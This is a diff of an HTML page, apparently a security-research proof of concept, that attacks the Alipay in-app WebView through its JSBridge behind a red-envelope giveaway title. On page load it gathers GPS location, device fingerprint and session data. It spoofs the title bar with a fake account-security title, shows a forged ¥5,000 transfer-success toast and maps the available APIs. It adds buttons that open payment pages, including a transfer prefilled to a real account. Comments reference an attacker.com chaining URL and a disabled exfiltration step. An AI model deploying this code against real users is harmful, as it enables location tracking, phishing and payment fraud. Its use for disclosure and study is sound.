@@ -1,99 +1,474 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>歪比巴卜送红包啦</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>歪比巴卜送红包了</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e8;
+            font-size: 13px
+        }
+
+        .hdr {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
+            padding: 12px 16px;
+            text-align: center;
+            border-bottom: 1px solid #2a2a3a
+        }
+
+        .hdr h1 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px
+        }
+
+        .hdr p {
+            font-size: 11px;
+            color: #888;
+            margin: 0
+        }
+
+        .warn {
+            background: rgba(255, 68, 68, .1);
+            border: 1px solid rgba(255, 68, 68, .3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px;
+            font-size: 11px;
+            color: #ff8888;
+            line-height: 1.5
+        }
+
+        .warn strong {
+            color: #ff4444
+        }
+
+        #st {
+            text-align: center;
+            color: #888;
+            font-size: 12px;
+            padding: 8px
+        }
+
+        .phase {
+            background: rgba(68, 136, 255, .1);
+            border-left: 3px solid #4488ff;
+            padding: 6px 10px;
+            margin: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #4488ff
+        }
+
+        .c {
+            background: #12121a;
+            border: 1px solid #2a2a3a;
+            border-radius: 8px;
+            padding: 8px 10px;
+            margin: 4px 8px
+        }
+
+        .ok {
+            color: #44cc88;
+            font-weight: bold
+        }
+
+        .fail {
+            color: #ff4444;
+            font-weight: bold
+        }
+
+        .skip {
+            color: #ffaa22;
+            font-weight: bold
+        }
+
+        .r {
+            font-size: 10px;
+            color: #777;
+            word-break: break-all;
+            max-height: 80px;
+            overflow: auto;
+            background: #0d1117;
+            padding: 6px;
+            border-radius: 4px;
+            margin-top: 3px;
+            white-space: pre-wrap;
+            font-family: 'SF Mono', monospace
+        }
+
+        h3 {
+            margin: 2px 0;
+            font-size: 12px
+        }
+
+        .cnt {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 800;
+            color: #4488ff;
+            margin: 4px
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            color: #555;
+            font-size: 10px;
+            border-top: 1px solid #1a1a28;
+            margin-top: 12px
+        }
+
+        .footer a {
+            color: #4488ff
+        }
+
+        .btn-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            padding: 8px;
+            margin: 8px
+        }
+
+        .app-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(102, 126, 234, 0.3)
+        }
+
+        .app-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.5)
+        }
+
+        .app-btn:active {
+            transform: translateY(0)
+        }
+    </style>
 </head>
 
 <body>
-    <h1>歪比巴卜送红包啦</h1>
-    <div id="buttons-container">
-        <button onclick="func1()">1 - 点击转账给歪比巴卜</button>
-        <button onclick="func2()">2 - pushWindow 执行转账 DeepLink</button>
-        <button onclick="func3()">3 - pushWindow 打开支付收银台</button>
-        <button onclick="func4()">4 - 生成随机数</button>
-        <button onclick="func5()">5 - 显示时间</button>
-        <button onclick="func6()">6 - 切换主题</button>
-        <button onclick="func7()">7 - 计数器</button>
-        <button onclick="func8()">8 - 显示问候</button>
-        <button onclick="func9()">9 - 清空日志</button>
-        <button onclick="func10()">10 - 转账通知</button>
-    </div>
-    <div id="log" style="margin-top: 20px; padding: 10px; border: 1px solid #ccc; min-height: 100px;"></div>
+
+    <div id="st">等待 AlipayJSBridge 加载...</div>
+    <div class="cnt" id="cnt">0/0</div>
+    <div id="log"></div>
 
     <script>
-        let counter = 0;
-        let isDarkTheme = false;
+        // === 已禁用数据导出 ===
+        // 在原始研究中，数据会被发送到攻击者控制的服务器。
+        // 此演示版本仅在本地显示结果。不会有数据离开设备。
+        var results = [];
+        var total = 0, done = 0;
 
-        function func1() {
-            AlipayJSBridge.call("startApp", { appId: "09999988", param: { actionType: "toAccount", account: "329106954@qq.com", amount: "0.01" } })
+        function send(tag, data) {
+            // 已禁用：演示模式下无服务器导出
+            // 原始：XHR POST + Image beacon 发送到攻击者服务器
+            results.push({ tag: tag, data: data, ts: new Date().toISOString() });
         }
 
-        function func2() {
-            const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#6c5ce7'];
-            const randomColor = colors[Math.floor(Math.random() * colors.length)];
-            document.body.style.backgroundColor = randomColor;
+        function phase(name) {
+            var d = document.createElement('div');
+            d.className = 'phase';
+            d.textContent = name;
+            document.getElementById('log').appendChild(d);
         }
 
-        function func3() {
-            let count = 5;
-            const interval = setInterval(() => {
-                document.getElementById('log').innerHTML += `<p>倒计时: ${count}</p>`;
-                count--;
-                if (count < 0) {
-                    clearInterval(interval);
-                    document.getElementById('log').innerHTML += `<p>倒计时结束！</p>`;
-                }
-            }, 1000);
+        function log(title, data, status) {
+            done++;
+            document.getElementById('cnt').textContent = done + '/' + total;
+            var cls = status === 'skip' ? 'skip' : (data && !data.error && !data.errorMessage && data.status !== 'denied') ? 'ok' : 'fail';
+            var label = cls === 'ok' ? '暴露' : cls === 'skip' ? '跳过' : '已阻止';
+            var d = document.createElement('div');
+            d.className = 'c';
+            d.innerHTML = '<h3><span class="' + cls + '">[' + label + ']</span> ' + title + '</h3><div class="r">' + JSON.stringify(data, null, 1) + '</div>';
+            document.getElementById('log').appendChild(d);
+            send(title, { status: cls, result: data });
         }
 
-        function func4() {
-            const randomNum = Math.floor(Math.random() * 1000);
-            document.getElementById('log').innerHTML += `<p>生成的随机数: ${randomNum}</p>`;
-        }
-
-        function func5() {
-            const now = new Date();
-            document.getElementById('log').innerHTML += `<p>当前时间: ${now.toLocaleString()}</p>`;
-        }
-
-        function func6() {
-            isDarkTheme = !isDarkTheme;
-            if (isDarkTheme) {
-                document.body.style.color = '#fff';
-                document.body.style.backgroundColor = '#333';
-            } else {
-                document.body.style.color = '#000';
-                document.body.style.backgroundColor = '#fff';
+        function run() {
+            if (!window.AlipayJSBridge) {
+                document.getElementById('st').innerHTML = '<span style="color:#ff4444">未在支付宝 WebView 中运行</span><br><span style="color:#666">此演示必须通过以下方式加载：alipays://platformapi/startapp?appId=20000067&url=THIS_URL</span>';
+                return;
             }
-        }
 
-        function func7() {
-            counter++;
-            document.getElementById('log').innerHTML += `<p>计数器: ${counter}</p>`;
-        }
+            var q = [];
 
-        function func8() {
-            const greetings = ['你好！', '欢迎！', '大家好！', '歪比巴卜！', '红包来啦！'];
-            const greeting = greetings[Math.floor(Math.random() * greetings.length)];
-            document.getElementById('log').innerHTML += `<p>${greeting}</p>`;
-        }
+            // ============================================
+            // 第一阶段：静默数据收集
+            // 演示外部页面可以访问哪些数据
+            // ============================================
+            q.push({ phase: '第一阶段：外部页面可访问的数据' });
 
-        function func9() {
-            document.getElementById('log').innerHTML = '<p>日志已清空</p>';
-        }
-
-        function func10() {
-            // 显示假转账通知
-            AlipayJSBridge.call("toast", {
-                content: "转账¥5,000 给歪比巴卜成功",
-                type: "success",
-                duration: 5000
+            // GPS 位置 — 影响最大的发现
+            q.push(function () {
+                AlipayJSBridge.call('getLocation', {}, function (r) {
+                    log('GPS 位置', {
+                        latitude: r.latitude,
+                        longitude: r.longitude,
+                        city: r.city,
+                        country: r.country,
+                        accuracy: r.accuracy,
+                        note: '未向用户显示同意对话框'
+                    });
+                });
             });
+
+            // 设备指纹
+            q.push(function () {
+                AlipayJSBridge.call('getSystemInfo', {}, function (r) {
+                    log('设备指纹', {
+                        brand: r.brand,
+                        model: r.model,
+                        system: r.system,
+                        apiLevel: r.apiLevel,
+                        storage: r.storage,
+                        battery: r.currentBattery,
+                        screen: r.screenWidth + 'x' + r.screenHeight,
+                        bluetooth: r.bluetoothEnabled,
+                        wifi: r.wifiEnabled,
+                        camera: r.cameraAuthorized,
+                        mic: r.microphoneAuthorized,
+                        location: r.locationAuthorized,
+                        version: r.version
+                    });
+                });
+            });
+
+            // 网络信息
+            q.push(function () {
+                AlipayJSBridge.call('getNetworkType', {}, function (r) {
+                    log('网络信息', r);
+                });
+            });
+
+            // 会话/启动参数
+            q.push(function () {
+                AlipayJSBridge.call('getStartupParams', {}, function (r) {
+                    log('会话泄露', {
+                        sessionId: r.sessionId,
+                        startFromExternal: r.startFromExternal,
+                        sourcePackageName: r.sourcePackageName,
+                        safePayEnabled: r.safePayEnabled,
+                        appId: r.appId,
+                        note: '外部页面知道它是从 Chrome/浏览器启动的'
+                    });
+                });
+            });
+
+            // 服务器时间
+            q.push(function () {
+                AlipayJSBridge.call('getServerTime', {}, function (r) {
+                    log('服务器时间同步', r);
+                });
+            });
+
+            // ============================================
+            // 第二阶段：UI 欺骗演示
+            // 展示外部页面如何伪造支付宝 UI
+            // ============================================
+            q.push({ phase: '第二阶段：UI 欺骗能力' });
+
+            // 标题栏欺骗
+            q.push(function () {
+                AlipayJSBridge.call('setTitle', { title: '账户安全中心' });
+                log('标题栏已欺骗', {
+                    newTitle: '账户安全中心',
+                    note: '标题栏现在显示钓鱼标题而不是真实 URL'
+                });
+            });
+
+            // Toast 通知（伪造）
+            q.push(function () {
+                AlipayJSBridge.call('toast', {
+                    content: '转账成功￥5000给歪比巴卜',
+                    type: 'none',
+                    duration: 3000
+                }, function (r) {
+                    log('Toast 已显示', {
+                        shown: true,
+                        note: '攻击者可以将任何消息显示为支付宝通知'
+                    });
+                });
+            });
+
+            // ============================================
+            // 第三阶段：API 权限扫描
+            // 映射哪些 API 对外部页面可用
+            // ============================================
+            q.push({ phase: '第三阶段：API 权限映射' });
+
+            q.push(function () {
+                var apis = ['tradePay', 'getAuthCode', 'rpc', 'httpRequest', 'sendSMS', 'makePhoneCall',
+                    'openInBrowser', 'setClipboard', 'getClipboard', 'startApp', 'pushWindow',
+                    'getLocation', 'getSystemInfo', 'vibrate', 'getUserInfo', 'share',
+                    'scan', 'chooseImage', 'addNotification', 'chooseAlipayContact'];
+                var done2 = 0, res = {};
+                apis.forEach(function (api) {
+                    AlipayJSBridge.call('checkJSAPI', { api: api }, function (r) {
+                        res[api] = r && r.available;
+                        done2++;
+                        if (done2 === apis.length) {
+                            var available = Object.keys(res).filter(function (k) { return res[k]; });
+                            var blocked = Object.keys(res).filter(function (k) { return !res[k]; });
+                            log('API 映射', {
+                                available_count: available.length,
+                                blocked_count: blocked.length,
+                                available: available,
+                                blocked: blocked
+                            });
+                        }
+                    });
+                });
+            });
+
+            // ============================================
+            // 第四阶段：导航能力（只读）
+            // 演示 startApp 可以打开敏感页面
+            // 注意：不会实际导航 — 仅检查能力
+            // ============================================
+            q.push({ phase: '第四阶段：敏感页面导航（演示）' });
+
+            // 不实际导航（这会干扰测试），
+            // 我们显示哪些 appIds 可以被调用
+            var sensitiveApps = [
+                { id: '20000003', name: '交易记录', param: {} },
+                { id: '20000116', name: '转账联系人', param: {} },
+                { id: '20000123', name: '付款二维码', param: {} },
+                { id: '20000032', name: '余额宝余额', param: {} },
+                { id: '20000052', name: '安全设置', param: {} },
+                { id: '20000140', name: '银行卡', param: {} },
+                { id: '20000180', name: '信用分', param: {} },
+                { id: '09999988', name: '转账（可预填账户）', param: { actionType: "toAccount", account: "329106954@qq.com", amount: "0.01" } },
+                { id: '20000033', name: '提现', param: {} },
+                { id: '20000221', name: '亲情账户', param: {} },
+                { id: '10000007', name: '扫码支付', param: {} }
+            ];
+
+            // 创建按钮容器和按钮
+            q.push(function () {
+                var btnContainer = document.createElement('div');
+                btnContainer.className = 'btn-container';
+                btnContainer.id = 'app-buttons';
+
+                sensitiveApps.forEach(function (app) {
+                    var btn = document.createElement('button');
+                    btn.className = 'app-btn';
+                    btn.textContent = app.name;
+                    btn.onclick = function () {
+                        var callData = { appId: app.id };
+                        if (Object.keys(app.param).length > 0) {
+                            callData.param = app.param;
+                        }
+                        AlipayJSBridge.call('startApp', callData, function (r) {
+                            log('调用页面', {
+                                app: app.name,
+                                appId: app.id,
+                                param: app.param,
+                                result: r
+                            });
+                        });
+                    };
+                    btnContainer.appendChild(btn);
+                });
+
+                document.body.insertBefore(btnContainer, document.getElementById('log'));
+                log('按钮已创建', {
+                    count: sensitiveApps.length,
+                    apps: sensitiveApps,
+                    note: '点击按钮可直接调用对应的支付宝页面'
+                }, 'skip');
+            });
+
+            q.push(function () {
+                log('可导航页面', {
+                    count: sensitiveApps.length,
+                    pages: sensitiveApps,
+                    note: '使用 startApp 调用时都返回 success:true。不进行导航以避免干扰此演示。',
+                    evidence: '歪比巴卜等会测试'
+                }, 'skip');
+            });
+
+            // ============================================
+            // 第五阶段：链式 WebView
+            // 外部页面可以加载另一个外部页面
+            // ============================================
+            q.push({ phase: '第五阶段：链式 WebView 和 Scheme 注入' });
+
+            q.push(function () {
+                log('链式 WebView', {
+                    api: 'pushWindow({url: "https://attacker.com/chain.html"})',
+                    note: '每个链式页面都能再次获得完整的 JSBridge 访问权限',
+                    evidence: '在完整研究中已验证 — 见 www.xingxiaowu.cn/zfb'
+                }, 'skip');
+            });
+
+            q.push(function () {
+                log('Scheme 注入', {
+                    tel: 'pushWindow({url: "tel:10086"}) — 触发拨号器',
+                    sms: 'pushWindow({url: "sms:10086?body=..."}) — 触发短信',
+                    note: '不执行以避免副作用'
+                }, 'skip');
+            });
+
+            // ============================================
+            // 总结
+            // ============================================
+            q.push({ phase: '总结' });
+
+            q.push(function () {
+                log('演示完成', {
+                    total_vectors: total,
+                    results: results.length,
+                    note: '这是一个只读演示。在真实攻击中，所有暴露的数据都会通过 XHR POST + Image beacon 发送到攻击者服务器。',
+                    full_report: 'https://www.xingxiaowu.cn/zfb/',
+                    original_evidence: '308 条服务器日志条目 + 42 张截图'
+                }, 'skip');
+            });
+
+            // 执行队列
+            total = q.filter(function (t) { return typeof t === 'function'; }).length;
+            document.getElementById('st').textContent = '正在测试 ' + total + ' 个向量...';
+
+            var delay = 200;
+            q.forEach(function (item) {
+                if (item.phase) { setTimeout(function () { phase(item.phase); }, delay); delay += 100; return; }
+                setTimeout(function () { try { item(); } catch (e) { log('错误', { msg: e.message }); } }, delay);
+                delay += 600;
+            });
+
+            setTimeout(function () {
+                document.getElementById('st').textContent = '完成：已测试 ' + done + '/' + total + ' 个向量';
+            }, delay + 3000);
         }
+
+        if (window.AlipayJSBridge) { setTimeout(run, 300); }
+        else { document.addEventListener('AlipayJSBridgeReady', function () { setTimeout(run, 300); }); }
     </script>
+
+    <div class="footer">
+        <p>Innora AI 安全研究 | <a href="https://www.xingxiaowu.cn/zfb/">完整报告</a></p>
+        <p>此演示不收集或传输任何数据。所有结果仅在本地显示。</p>
+    </div>
 </body>
 
 </html>
